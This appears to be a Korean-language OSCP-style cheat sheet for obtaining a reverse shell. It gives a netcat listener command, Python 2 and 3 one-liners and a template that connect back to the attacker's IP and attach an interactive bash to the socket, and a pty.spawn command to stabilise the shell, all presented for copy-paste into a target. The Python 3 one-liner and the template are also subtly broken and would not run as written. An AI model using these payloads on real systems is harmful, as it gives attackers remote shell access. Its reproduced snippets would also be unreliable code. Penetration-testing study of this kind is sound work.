## 실전 리버스 쉘 전송 방법 (OSCP 스타일)

1. **공격자 리스너 대기**

```bash
nc -lvnp 4444
l: listen
v: verbose mode
n: numeric-only IP addresses
p: port number

```

- 공격자(내 컴퓨터)에서 먼저 리스너를 열어둔다.

2. **타겟에 파이썬 리버스 쉘 전송**

- 타겟이 명령어를 바로 실행하지 않고 파이썬 코드를 기대하는 경우, 아래처럼 입력한다.
- 파이썬2 환경:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("내IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])
```

- 파이썬3 환경:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("내IP",4444));import sys;for fd in (0,1,2):os.dup2(s.fileno(),fd);subprocess.call(["/bin/bash","-i"])
```

- "내IP"는 공격자 리스너가 열려있는 실제 IP로 바꿔서 입력.

3. **커스텀 템플릿 활용**

- 환경에 따라 아래 코드에서 IP와 포트만 바꿔서 입력하면 됨.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("내IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
subprocess.call(["/bin/bash","-i"])
```

4. **연결 후 TTY 안정화**

- 쉘이 연결되면 바로 아래 명령어 입력:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**팁:**

- 타겟이 파이썬 코드를 입력받는 환경이면 위 코드 그대로 복붙해서 사용.
- 연결이 안 되면 포트, 방화벽, 네트워크 경로부터 점검.
- OSCP에서는 직접 입력/반응 확인하며 상황에 맞게 커스텀하는 게 핵심.

**실전 예시 흐름:**

1. 내 컴퓨터에서 `nc -lvnp 4444`
2. 타겟에 파이썬 리버스 쉘 코드 입력
3. 연결되면 TTY 안정화
